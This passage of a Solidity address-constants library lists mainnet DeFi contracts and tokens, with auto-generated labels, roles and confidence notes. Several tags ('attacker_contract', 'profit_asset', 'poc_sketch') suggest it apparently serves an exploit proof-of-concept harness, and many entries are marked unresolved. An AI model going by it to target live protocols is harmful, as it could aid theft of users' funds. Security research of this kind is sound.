    address internal constant fUSDC = 0x9Fb7b4477576Fe5B32be4C1843aFB1e55F251B33; // Addresses.fUSDC = 0x9fb7b4477576fe5b32be4c1843afb1e55f251b33 label=fToken token_symbol=fUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48; // Addresses.USDC = 0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48 label=FiatTokenProxy token_symbol=USDC roles=asset|contract|economic_asset|observed_address|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant UsdsPsmWrapper = 0xA188EEC8F81263234dA3622A406892F3D630f98c; // Addresses.UsdsPsmWrapper = 0xa188eec8f81263234da3622a406892f3d630f98c label=UsdsPsmWrapper roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant sUSDS_7FBD = 0xa3931d71877C0E7a3148CB7Eb4463524FEc27fbD; // Addresses.sUSDS_7FBD = 0xa3931d71877c0e7a3148cb7eb4463524fec27fbd label=ERC1967Proxy token_symbol=sUSDS roles=asset|contract|economic_asset|economic_holder|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant A_A69FA9_8F49 = 0xA69FA9582065E9EfE9AabF8AF686B6e36bC78f49; // Addresses.A_A69FA9_8F49 = 0xa69fa9582065e9efe9aabf8af686b6e36bc78f49 label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_A6D695_182A = 0xA6D6950c9F177F1De7f7757FB33539e3Ec60182a; // Addresses.A_A6D695_182A = 0xa6d6950c9f177f1de7f7757fb33539e3ec60182a label=unresolved roles=observed_address source=unresolved confidence=low
    address internal constant A_A6FB46_C84C = 0xA6Fb46b115aE21E19475D8eE58C2F3E08b23C84C; // Addresses.A_A6FB46_C84C = 0xa6fb46b115ae21e19475d8ee58c2f3e08b23c84c label=unresolved roles=observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant CapToken = 0xa76645E15c267b876999bf7689E0b2C1EE29BFE6; // Addresses.CapToken = 0xa76645e15c267b876999bf7689e0b2c1ee29bfe6 label=CapToken roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant OUSD_CC33 = 0xA7B7c59a1705E4A624eA8a4ad8a06F9DE22Dcc33; // Addresses.OUSD_CC33 = 0xa7b7c59a1705e4a624ea8a4ad8a06f9de22dcc33 label=OUSD token_symbol=OUSD roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant gtusdcrwa = 0xA8875aaeBc4f830524e35d57F9772FfAcbdD6C45; // Addresses.gtusdcrwa = 0xa8875aaebc4f830524e35d57f9772ffacbdd6c45 label=MetaMorphoV1_1 token_symbol=gtusdcrwa roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant eUSDC_50 = 0xa94F9CE821C7bD57cc12991CB46ca19f5789278F; // Addresses.eUSDC_50 = 0xa94f9ce821c7bd57cc12991cb46ca19f5789278f label=BeaconProxy token_symbol=eUSDC-50 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant Vow = 0xA950524441892A31ebddF91d3cEEFa04Bf454466; // Addresses.Vow = 0xa950524441892a31ebddf91d3ceefa04bf454466 label=Vow roles=observed_address source=etherscan_v2 confidence=high
    address internal constant SiloConfig_F5F1 = 0xA98c6bc6D9Bd822b88C74D5cC6B59695b7A5F5F1; // Addresses.SiloConfig_F5F1 = 0xa98c6bc6d9bd822b88c74d5cc6b59695b7a5f5f1 label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant tsvSummerfiUSDC = 0xA9ca4909700505585B1aD2a1579dA3b670FFA9c4; // Addresses.tsvSummerfiUSDC = 0xa9ca4909700505585b1ad2a1579da3b670ffa9c4 label=Strategy token_symbol=tsvSummerfiUSDC roles=asset|contract|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant CapFarm = 0xAc21B22B5aEb11bc32De4ecF59E4538fCa48b694; // Addresses.CapFarm = 0xac21b22b5aeb11bc32de4ecf59e4538fca48b694 label=CapFarm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant ATOKEN_IMPL_7ADA = 0xadC45Df3cf1584624C97338BEF33363BF5b97AdA; // Addresses.ATOKEN_IMPL_7ADA = 0xadc45df3cf1584624c97338bef33363bf5b97ada label=ATokenInstance token_symbol=ATOKEN_IMPL roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant StablePool = 0xaE255Db04BA78519f33871c557d8fd6bafDb83bD; // Addresses.StablePool = 0xae255db04ba78519f33871c557d8fd6bafdb83bd label=StablePool roles=observed_address source=etherscan_v2 confidence=high
    address internal constant Router = 0xAE563E3f8219521950555F5962419C8919758Ea2; // Addresses.Router = 0xae563e3f8219521950555f5962419c8919758ea2 label=Router roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant RocketTokenRETH = 0xae78736Cd615f374D3085123A210448E74Fc6393; // Addresses.RocketTokenRETH = 0xae78736cd615f374d3085123a210448e74fc6393 label=RocketTokenRETH roles=observed_address source=etherscan_v2 confidence=high
    address internal constant SiloConfig_1F61 = 0xB0b37f551E18c540Cf7748589d24589945FC1f61; // Addresses.SiloConfig_1F61 = 0xb0b37f551e18c540cf7748589d24589945fc1f61 label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_CD34 = 0xB10c29b85E388f3EC1189f8EBC78b3f71408Cd34; // Addresses.MorphoVaultArk_CD34 = 0xb10c29b85e388f3ec1189f8ebc78b3f71408cd34 label=MorphoVaultArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FleetCommanderRewardsManager_FC78 = 0xB1A851b8c70A4749408754d398702153A61DFc78; // Addresses.FleetCommanderRewardsManager_FC78 = 0xb1a851b8c70a4749408754d398702153a61dfc78 label=FleetCommanderRewardsManager roles=observed_address source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_0F29 = 0xB2dE822f840a9F1EC160212e14e08749783E0F29; // Addresses.ERC4626Ark_0F29 = 0xb2de822f840a9f1ec160212e14e08749783e0f29 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant dUSDC_146 = 0xb4a006736B4d8ca3bf0F1c576Bfd62D945a08D76; // Addresses.dUSDC_146 = 0xb4a006736b4d8ca3bf0f1c576bfd62d945a08d76 label=ShareDebtToken token_symbol=dUSDC-146 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant senPYUSDmain = 0xb576765fB15505433aF24FEe2c0325895C559FB2; // Addresses.senPYUSDmain = 0xb576765fb15505433af24fee2c0325895c559fb2 label=VaultV2 token_symbol=senPYUSDmain roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_EB37 = 0xb5e9c7Ad5bB1e21B12aD62066FF1Fb388ebdeB37; // Addresses.MorphoVaultArk_EB37 = 0xb5e9c7ad5bb1e21b12ad62066ff1fb388ebdeb37 label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant yOG_USDC_V2 = 0xB885F6d448dA7E2C642Ec31190B629E40E87B069; // Addresses.yOG_USDC_V2 = 0xb885f6d448da7e2c642ec31190b629e40e87b069 label=VaultV2 token_symbol=yOG-USDC-V2 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_FD6D = 0xb9a97499C3A400E70a99EE62BabCE2B7a6f8fd6D; // Addresses.MorphoVaultArk_FD6D = 0xb9a97499c3a400e70a99ee62babce2b7a6f8fd6d label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8; // Addresses.BalancerVault = 0xba12222222228d8ba445958a75a0704d566bf2c8 label=BalancerVault roles=known_protocol source=poc_sketch.known_addresses confidence=high
    address internal constant Vault_BA1333 = 0xbA1333333333a1BA1108E8412f11850A5C319bA9; // Addresses.Vault_BA1333 = 0xba1333333333a1ba1108e8412f11850a5c319ba9 label=Vault roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_9DD0 = 0xba3D2Dc1670763c6729CC923A922C7513C0f9DD0; // Addresses.MorphoChainlinkOracleV2_9DD0 = 0xba3d2dc1670763c6729cc923a922c7513c0f9dd0 label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant A_BA77D9_12C1 = 0xBA77D947E23710a397Dd777A47254E1c2bd612C1; // Addresses.A_BA77D9_12C1 = 0xba77d947e23710a397dd777a47254e1c2bd612c1
    address internal constant TokenizedStrategy = 0xBB51273D6c746910C7C06fe718f30c936170feD0; // Addresses.TokenizedStrategy = 0xbb51273d6c746910c7c06fe718f30c936170fed0 label=TokenizedStrategy roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant Morpho = 0xBBBBBbbBBb9cC5e90e3b3Af64bdAF62C37EEFFCb; // Addresses.Morpho = 0xbbbbbbbbbb9cc5e90e3b3af64bdaf62c37eeffcb label=Morpho roles=asset|attacker_callback_contract|attacker_contract|attacker_surface_contract|code_contract|contract|localized_contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant sUSDC = 0xBc65ad17c5C0a2A4D159fa5a503f4992c7B545FE; // Addresses.sUSDC = 0xbc65ad17c5c0a2a4d159fa5a503f4992c7b545fe label=ERC1967Proxy token_symbol=sUSDC roles=asset|contract|economic_asset|economic_holder|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_EEA6 = 0xBC7070bC34ab83f15Fda79CDA0c90a30F352EeA6; // Addresses.ERC4626Ark_EEA6 = 0xbc7070bc34ab83f15fda79cda0c90a30f352eea6 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant bUSDC_146 = 0xbc8DCAC649bdCf80cF598A1ef293023c2224C043; // Addresses.bUSDC_146 = 0xbc8dcac649bdcf80cf598a1ef293023c2224c043 label=Silo token_symbol=bUSDC-146 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant Vyper_contract_BEBC44 = 0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7; // Addresses.Vyper_contract_BEBC44 = 0xbebc44782c7db0a1a60cb6fe97d0b483032ff1c7 label=Vyper_contract roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant steakUSDC = 0xBEEF01735c132Ada46AA9aA4c54623cAA92A64CB; // Addresses.steakUSDC = 0xbeef01735c132ada46aa9aa4c54623caa92a64cb label=MetaMorpho token_symbol=steakUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant infinifiUSDC = 0xBEeF1f5Bd88285E5B239B6AAcb991d38ccA23Ac9; // Addresses.infinifiUSDC = 0xbeef1f5bd88285e5b239b6aacb991d38cca23ac9 label=MetaMorphoV1_1 token_symbol=infinifiUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant vbshUSDC = 0xBEefb9f61CC44895d8AEc381373555a64191A9c4; // Addresses.vbshUSDC = 0xbeefb9f61cc44895d8aec381373555a64191a9c4 label=MetaMorphoV1_1 token_symbol=vbshUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant bbqUSDC = 0xBEeFFF209270748ddd194831b3fa287a5386f5bC; // Addresses.bbqUSDC = 0xbeefff209270748ddd194831b3fa287a5386f5bc label=MetaMorpho token_symbol=bbqUSDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant AaveV3Farm_3580 = 0xbFd5FC8DecA3C6128bfCE0FE46c25616811c3580; // Addresses.AaveV3Farm_3580 = 0xbfd5fc8deca3c6128bfce0fe46c25616811c3580 label=AaveV3Farm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant dPENDLE_LPT_WRAPPED_117 = 0xc024b96456dfD675144Ae6897f192b55784cc12d; // Addresses.dPENDLE_LPT_WRAPPED_117 = 0xc024b96456dfd675144ae6897f192b55784cc12d label=ShareDebtToken token_symbol=dPENDLE-LPT-WRAPPED-117 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant InitializableImmutableAdminUpgradeabilityProxy_C13E21 =
        0xC13e21B648A5Ee794902342038FF3aDAB66BE987; // Addresses.InitializableImmutableAdminUpgradeabilityProxy_C13E21 = 0xc13e21b648a5ee794902342038ff3adab66be987 label=InitializableImmutableAdminUpgradeabilityProxy roles=asset|contract|sender source=etherscan_v2 confidence=high
    address internal constant USDC_F32D = 0xC155444481854c60e7a29f4150373f479988F32D; // Addresses.USDC_F32D = 0xc155444481854c60e7a29f4150373f479988f32d label=PoolV3 token_symbol=USDC roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant senPYUSDPRIMEv2 = 0xC21b08C16458202593D4D9B26b9984Ee67b38BbD; // Addresses.senPYUSDPRIMEv2 = 0xc21b08c16458202593d4d9b26b9984ee67b38bbd label=VaultV2 token_symbol=senPYUSDPRIMEv2 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant A_C2A11B_34D4 = 0xc2A11ba52aD80124cCC60774c881f93738f334d4; // Addresses.A_C2A11B_34D4 = 0xc2a11ba52ad80124ccc60774c881f93738f334d4
    address internal constant SiloConfig_8EBE = 0xC390873e160D3d7f7A5903cB705F0B328C778EbE; // Addresses.SiloConfig_8EBE = 0xc390873e160d3d7f7a5903cb705f0b328c778ebe label=SiloConfig roles=sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MPLhysUSDC1 = 0xC39a5A616F0ad1Ff45077FA2dE3f79ab8eb8b8B9; // Addresses.MPLhysUSDC1 = 0xc39a5a616f0ad1ff45077fa2de3f79ab8eb8b8b9 label=MaplePool token_symbol=MPLhysUSDC1 roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant cUSDCv3_CDC3 = 0xc3d688B66703497DAA19211EEdff47f25384cdc3; // Addresses.cUSDCv3_CDC3 = 0xc3d688b66703497daa19211eedff47f25384cdc3 label=TransparentUpgradeableProxy token_symbol=cUSDCv3 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_2AD5 = 0xC496c6a4D1D1E184A87424dc66F4Eb6FDb9F2aD5; // Addresses.ERC4626Ark_2AD5 = 0xc496c6a4d1d1e184a87424dc66f4eb6fdb9f2ad5 label=ERC4626Ark roles=observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant gtusdcf = 0xc582F04d8a82795aa2Ff9c8bb4c1c889fe7b754e; // Addresses.gtusdcf = 0xc582f04d8a82795aa2ff9c8bb4c1c889fe7b754e label=MetaMorphoV1_1 token_symbol=gtusdcf roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant eUSDC_56 = 0xc727069c0eb261Be642272fe3848518192683fFc; // Addresses.eUSDC_56 = 0xc727069c0eb261be642272fe3848518192683ffc label=BeaconProxy token_symbol=eUSDC-56 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_E40D = 0xc7BE7593FD5453Db5AdcC1d7103f2211d4F2e40D; // Addresses.MorphoChainlinkOracleV2_E40D = 0xc7be7593fd5453db5adcc1d7103f2211d4f2e40d label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant FxSaveFarm = 0xc9c06c49Ed83d12BCA88BEd999d4920f049Beabc; // Addresses.FxSaveFarm = 0xc9c06c49ed83d12bca88bed999d4920f049beabc label=FxSaveFarm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant AaveV3Ark = 0xC9dd080C9ecCFcdbf379714D84CdC8Bd01046AE1; // Addresses.AaveV3Ark = 0xc9dd080c9eccfcdbf379714d84cdc8bd01046ae1 label=AaveV3Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_15B4 = 0xcA2e14c7C03C9961c296C89e2d2279F5F7DB15b4; // Addresses.MorphoVaultArk_15B4 = 0xca2e14c7c03c9961c296c89e2d2279f5f7db15b4 label=MorphoVaultArk roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_5C35 = 0xCa75E855a33acC44DDA9d48578Df5Df7602b5c35; // Addresses.ERC4626Ark_5C35 = 0xca75e855a33acc44dda9d48578df5df7602b5c35 label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant RedeemController = 0xCb1747E89a43DEdcF4A2b831a0D94859EFeC7601; // Addresses.RedeemController = 0xcb1747e89a43dedcf4a2b831a0d94859efec7601 label=RedeemController roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant FiatTokenProxy = 0xcbB7C0000aB88B473b1f5aFd9ef808440eed33Bf; // Addresses.FiatTokenProxy = 0xcbb7c0000ab88b473b1f5afd9ef808440eed33bf label=FiatTokenProxy roles=observed_address source=etherscan_v2 confidence=high
    address internal constant eUSDC_19 = 0xcBC9B61177444A793B85442D3a953B90f6170b7D; // Addresses.eUSDC_19 = 0xcbc9b61177444a793b85442d3a953b90f6170b7d label=BeaconProxy token_symbol=eUSDC-19 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoMarketV1AdapterV2_8B41 = 0xCc0F95e65d2ce7fB715bfb418Bf61314d0878b41; // Addresses.MorphoMarketV1AdapterV2_8B41 = 0xcc0f95e65d2ce7fb715bfb418bf61314d0878b41 label=MorphoMarketV1AdapterV2 roles=asset|contract|observed_address|recipient|sender source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_1CC4 = 0xCCBd61b6c2fB58Da5bbD8937Ca25164eF29c1cc4; // Addresses.ERC4626Ark_1CC4 = 0xccbd61b6c2fb58da5bbd8937ca25164ef29c1cc4 label=ERC4626Ark roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant cUSD = 0xcCcc62962d17b8914c62D74FfB843d73B2a3cccC; // Addresses.cUSD = 0xcccc62962d17b8914c62d74ffb843d73b2a3cccc label=ERC1967Proxy token_symbol=cUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant eUSDC_8 = 0xce45EF0414dE3516cAF1BCf937bF7F2Cf67873De; // Addresses.eUSDC_8 = 0xce45ef0414de3516caf1bcf937bf7f2cf67873de label=BeaconProxy token_symbol=eUSDC-8 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant bUSDC_127 = 0xCE6aB1c71981e79Cd30052C521c162674251018a; // Addresses.bUSDC_127 = 0xce6ab1c71981e79cd30052c521c162674251018a label=Silo token_symbol=bUSDC-127 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoV2VaultArk_400B = 0xD00C168451fDdD8Ef839E5c0f5B9666143d9400b; // Addresses.MorphoV2VaultArk_400B = 0xd00c168451fddd8ef839e5c0f5b9666143d9400b label=MorphoV2VaultArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant AaveV3CompoundStrategy = 0xd023Aac0e2D46c93d4c6e8e2A449bF2d4687804f; // Addresses.AaveV3CompoundStrategy = 0xd023aac0e2d46c93d4c6e8e2a449bf2d4687804f label=AaveV3CompoundStrategy roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoV2VaultArk_958F = 0xd0aAdDe147b6D683cBb80bFE0Fb9e8dB9De1958F; // Addresses.MorphoV2VaultArk_958F = 0xd0aadde147b6d683cbb80bfe0fb9e8db9de1958f label=MorphoV2VaultArk roles=asset|contract|economic_holder|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant mGLOBAL_F75A = 0xD22bE883b7194Ac2D1751Bf8E6e4962D87f2f75a; // Addresses.mGLOBAL_F75A = 0xd22be883b7194ac2d1751bf8e6e4962d87f2f75a label=mGLOBAL roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant MorphoChainlinkOracleV2_FA6D = 0xd2cC46b9B2D761502eF933320ecf0268EC0dfa6d; // Addresses.MorphoChainlinkOracleV2_FA6D = 0xd2cc46b9b2d761502ef933320ecf0268ec0dfa6d label=MorphoChainlinkOracleV2 roles=observed_address source=etherscan_v2 confidence=high
    address internal constant bUSDC_123 = 0xd38d220b94e35e0EBc952437182F7f3244AF97A9; // Addresses.bUSDC_123 = 0xd38d220b94e35e0ebc952437182f7f3244af97a9 label=Silo token_symbol=bUSDC-123 roles=asset|contract|observed_address|recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant MorphoVaultArk_14C6 = 0xd3faCda7eD0356F2439f96C3dC378042864F14C6; // Addresses.MorphoVaultArk_14C6 = 0xd3facda7ed0356f2439f96c3dc378042864f14c6 label=MorphoVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant MC_PTs = 0xd41830d88dfD08678b0B886E0122193d54b02Acc; // Addresses.MC_PTs = 0xd41830d88dfd08678b0b886e0122193d54b02acc label=MetaMorphoV1_1 token_symbol=MC_PTs roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant USUALUSDC = 0xd63070114470f685b75B74D60EEc7c1113d33a3D; // Addresses.USUALUSDC = 0xd63070114470f685b75b74d60eec7c1113d33a3d label=MetaMorpho token_symbol=USUALUSDC+ roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant SiloManagedVaultArk_A170 = 0xd7038E29f353cc6AC601CFE56AF3e1AFFa80A170; // Addresses.SiloManagedVaultArk_A170 = 0xd7038e29f353cc6ac601cfe56af3e1affa80a170 label=SiloManagedVaultArk roles=observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant SafeProxy_903D = 0xd8454B3787c6Aab1cf2846AF7882f8c440C3903d; // Addresses.SafeProxy_903D = 0xd8454b3787c6aab1cf2846af7882f8c440c3903d label=SafeProxy roles=observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant SparkSUSDCFarm = 0xd880D7C5CaFdbE2AEc281250995abF612235e563; // Addresses.SparkSUSDCFarm = 0xd880d7c5cafdbe2aec281250995abf612235e563 label=SparkSUSDCFarm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant dUSDCV3 = 0xda00000035fef4082F78dEF6A8903bee419FbF8E; // Addresses.dUSDCV3 = 0xda00000035fef4082f78def6a8903bee419fbf8e label=PoolV3 token_symbol=dUSDCV3 roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant LiquidationFarm = 0xda40ce7DdDBE7D54A106D32575b2CCF41dDb1A11; // Addresses.LiquidationFarm = 0xda40ce7dddbe7d54a106d32575b2ccf41ddb1a11 label=LiquidationFarm roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7; // Addresses.USDT = 0xdac17f958d2ee523a2206206994597c13d831ec7 label=TetherToken token_symbol=USDT roles=asset|contract|observed_address|recipient|token_related source=etherscan_v2 confidence=high
    address internal constant ERC4626Ark_C02E = 0xDB6d68d571FbEF7D67827844DD800884EA9cc02E; // Addresses.ERC4626Ark_C02E = 0xdb6d68d571fbef7d67827844dd800884ea9cc02e label=ERC4626Ark roles=recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant siUSD = 0xDBDC1Ef57537E34680B898E1FEBD3D68c7389bCB; // Addresses.siUSD = 0xdbdc1ef57537e34680b898e1febd3d68c7389bcb label=StakedToken token_symbol=siUSD roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant TransparentUpgradeableProxy_DBF4FB = 0xdbf4FB6C310C1C85D0b41B5DbCA06096F2E7099F; // Addresses.TransparentUpgradeableProxy_DBF4FB = 0xdbf4fb6c310c1c85d0b41b5dbca06096f2e7099f label=TransparentUpgradeableProxy roles=recipient|sender|storage_contract source=etherscan_v2 confidence=high
    address internal constant USDS_384F = 0xdC035D45d973E3EC169d2276DDab16f1e407384F; // Addresses.USDS_384F = 0xdc035d45d973e3ec169d2276ddab16f1e407384f label=ERC1967Proxy token_symbol=USDS roles=asset|contract|economic_asset|observed_address|recipient|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant gtUSDC = 0xdd0f28e19C1780eb6396170735D45153D261490d; // Addresses.gtUSDC = 0xdd0f28e19c1780eb6396170735d45153d261490d label=MetaMorpho token_symbol=gtUSDC roles=asset|contract|economic_asset|observed_address|recipient|sender|storage_contract|token_related source=etherscan_v2 confidence=high
    address internal constant dUSDC_113 = 0xDD3DD9A771db0FdbA2B04776D219ED128dfd010C; // Addresses.dUSDC_113 = 0xdd3dd9a771db0fdba2b04776d219ed128dfd010c label=ShareDebtToken token_symbol=dUSDC-113 roles=asset|contract|observed_address|recipient|storage_contract source=etherscan_v2 confidence=high
    address internal constant ApxUSD = 0xDd71Fd677fDe2eD2579A3C45204f41a11016ccB4; // Addresses.ApxUSD = 0xdd71fd677fde2ed2579a3c45204f41a11016ccb4 label=ApxUSD roles=asset|contract|observed_address|recipient source=etherscan_v2 confidence=high
    address internal constant A_DDDD77_6B83 = 0xDddd770BADd886dF3864029e4B377B5F6a2B6b83; // Addresses.A_DDDD77_6B83 = 0xdddd770badd886df3864029e4b377b5f6a2b6b83 label=unresolved roles=observed_address source=unresolved confidence=low
    address internal constant A_DF62F5_A22F = 0xDF62f57Ea333a842Db200d4892c90F98204fa22F; // Addresses.A_DF62F5_A22F = 0xdf62f57ea333a842db200d4892c90f98204fa22f label=unresolved roles=observed_address|recipient source=unresolved confidence=low
    address internal constant A_E0212E_950F = 0xE0212eBbBFfadE416C5DaBAEA2Ea6c7a921c950F; // Addresses.A_E0212E_950F = 0xe0212ebbbffade416c5dabaea2ea6c7a921c950f label=unresolved roles=observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant eUSDC_22 = 0xe0a80d35bB6618CBA260120b279d357978c42BCE; // Addresses.eUSDC_22 = 0xe0a80d35bb6618cba260120b279d357978c42bce label=unresolved token_symbol=eUSDC-22 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant kpk_USDC_Prime = 0xe108fbc04852B5df72f9E44d7C29F47e7A993aDd; // Addresses.kpk_USDC_Prime = 0xe108fbc04852b5df72f9e44d7c29f47e7a993add label=unresolved token_symbol=kpk_USDC_Prime roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant A_E20860_E58A = 0xe2086064fcEE389a46e1C3cc31a35602B8E5E58A; // Addresses.A_E20860_E58A = 0xe2086064fcee389a46e1c3cc31a35602b8e5e58a label=unresolved roles=sender|storage_contract source=unresolved confidence=low
    address internal constant Api3CoreUSDC = 0xe2221Aa07ec3266DA87763E2b1e28d07A8a4e53b; // Addresses.Api3CoreUSDC = 0xe2221aa07ec3266da87763e2b1e28d07a8a4e53b label=Api3CoreUSDC token_symbol=Api3CoreUSDC roles=asset|contract|economic_asset|observed_address|profit_asset|recipient|sender|storage_contract|token_related source=asset_delta.profit_candidates confidence=medium
    address internal constant xUSD = 0xE2Fc85BfB48C4cF147921fBE110cf92Ef9f26F94; // Addresses.xUSD = 0xe2fc85bfb48c4cf147921fbe110cf92ef9f26f94 label=unresolved token_symbol=xUSD roles=asset|contract|observed_address|recipient|token_related source=unresolved confidence=low
    address internal constant USDG = 0xe343167631d89B6Ffc58B88d6b7fB0228795491D; // Addresses.USDG = 0xe343167631d89b6ffc58b88d6b7fb0228795491d label=unresolved token_symbol=USDG roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_E399C3_76A8 = 0xe399C348b679fD111B51f3f4D3c1159701df76a8; // Addresses.A_E399C3_76A8 = 0xe399c348b679fd111b51f3f4d3c1159701df76a8 label=unresolved roles=observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_E3EE1B_55CC = 0xe3eE1b26AF5396Cec45c8C3b4c4FD5136A2455CC; // Addresses.A_E3EE1B_55CC = 0xe3ee1b26af5396cec45c8c3b4c4fd5136a2455cc label=unresolved roles=recipient|sender|storage_contract source=unresolved confidence=low
    address internal constant A_E4031E_E8A6 = 0xE4031e271809d20074E4bef1caeEfEc5f710e8A6; // Addresses.A_E4031E_E8A6 = 0xe4031e271809d20074e4bef1caeefec5f710e8a6 label=unresolved roles=asset|contract|observed_address|recipient source=unresolved confidence=low
    address internal constant dUSDC_155 = 0xe5314CC2a2FA0b1c58CB597f0B5930343F3aC768; // Addresses.dUSDC_155 = 0xe5314cc2a2fa0b1c58cb597f0b5930343f3ac768 label=unresolved token_symbol=dUSDC-155 roles=asset|contract|observed_address|recipient|storage_contract source=unresolved confidence=low
    address internal constant A_E59242_1564 = 0xE592427A0AEce92De3Edee1F18E0157C05861564; // Addresses.A_E59242_1564 = 0xe592427a0aece92de3edee1f18e0157c05861564 label=unresolved roles=asset|contract|observed_address|recipient|sender|storage_contract source=unresolved confidence=low
